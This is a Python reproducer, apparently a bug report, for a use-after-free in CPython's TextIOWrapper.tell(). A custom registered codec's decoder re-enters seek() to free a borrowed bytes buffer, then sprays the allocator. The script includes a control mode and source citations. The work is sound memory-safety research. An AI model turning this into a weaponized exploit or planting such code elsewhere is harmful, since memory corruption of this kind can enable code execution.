"""textio.c: _io_TextIOWrapper_tell_impl walks a raw char* out of a BORROWED
bytes object across a user decoder call that can free it.

Modules/_io/textio.c:2873  (borrowed, never INCREF'd)
    if (!PyArg_ParseTuple(self->snapshot, "iO", &cookie.dec_flags, &next_input))

Modules/_io/textio.c:2938 / :2981-2984
    input     = PyBytes_AS_STRING(next_input);
    input_end = input + PyBytes_GET_SIZE(next_input);
    input += skip_bytes;
    while (input < input_end) {
        DECODER_DECODE(input, (Py_ssize_t)1, n);   /* :2987 */
        ...
        DECODER_GETSTATE();                        /* :2991 */
        input++;                                   /* :3003 */
    }

DECODER_DECODE (:2924) is
    _PyObject_CallMethod(self->decoder, &_Py_ID(decode), "y#", start, len)
and self->decoder is whatever codecs.register() handed back -- arbitrary
Python.  next_input's ONLY owner is self->snapshot, and a re-entrant call on
the same TextIOWrapper drops it:
    seek()      textio.c:2669 :2736  Py_CLEAR(self->snapshot)
    read()      textio.c:2115
    readline()  textio.c:2319
    write()     textio.c:1870
    __next__()  textio.c:3297

Guarded twin: the same function INCREFs the other borrowed field it keeps --
textio.c:1980/1981 `Py_INCREF(dec_buffer); Py_INCREF(dec_flags);` in
textiowrapper_read_chunk, right after the identical PyArg_ParseTuple of a
decoder state tuple.  tell() does the parse and skips the INCREF.

Usage: <python> textio_tell_snapshot_uaf.py [mode]
  mode=probe   (default) decoder re-enters seek() -> frees next_input
  mode=control identical decoder, no re-entry -> must be clean
"""
import sys

MODE = sys.argv[1] if len(sys.argv) > 1 else "probe"

import codecs
import io

state = {"f": None, "fired": 0, "junk": None}


class ReDecoder:
    """Minimal incremental decoder; latin-1 semantics, 1 byte -> 1 char."""

    def __init__(self, errors="strict"):
        self.errors = errors

    def decode(self, data, final=False):
        if MODE == "probe" and not state["fired"] and state["f"] is not None:
            state["fired"] = 1
            # Py_CLEAR(self->snapshot) -> last reference to next_input dies.
            state["f"].seek(0)
            # churn the allocator so the freed bytes block is recycled
            state["junk"] = [bytes(b"\xcc" * 96) for _ in range(4000)]
        return bytes(data).decode("latin-1")

    def getstate(self):
        return (b"", 0)

    def setstate(self, s):
        pass

    def reset(self):
        pass


class ReEncoder:
    def __init__(self, errors="strict"):
        self.errors = errors

    def encode(self, obj, final=False):
        return obj.encode("latin-1")

    def reset(self):
        pass

    def setstate(self, s):
        pass

    def getstate(self):
        return 0


def search(name):
    if name != "reentrant_test_codec":
        return None
    return codecs.CodecInfo(
        name="reentrant_test_codec",
        encode=lambda s, errors="strict": (s.encode("latin-1"), len(s)),
        decode=lambda b, errors="strict": (bytes(b).decode("latin-1"), len(b)),
        incrementalencoder=ReEncoder,
        incrementaldecoder=ReDecoder,
    )


codecs.register(search)

# NB: a bare BytesIO is NOT usable here.  BytesIO.read1() has a zero-copy fast
# path (bytesio.c:476-481 peek_bytes_lock_held) that returns its OWN internal
# buffer object, so next_input would keep a second owner and never be freed.
# Interposing a BufferedReader makes each chunk a fresh PyBytes whose only
# owner is self->snapshot -- which is the situation for every real file.
raw = io.BufferedReader(io.BytesIO(b"abcdefghijklmnopqrstuvwxyz" * 64))
f = io.TextIOWrapper(raw, encoding="reentrant_test_codec")
state["f"] = f

print("read ->", repr(f.read(5)))
sys.stdout.flush()
print("calling tell()")
sys.stdout.flush()
try:
    print("tell ->", f.tell())
except BaseException as e:
    print("tell raised", type(e).__name__ + ":", e)
sys.stdout.flush()
print("fired =", state["fired"])
print("survived")
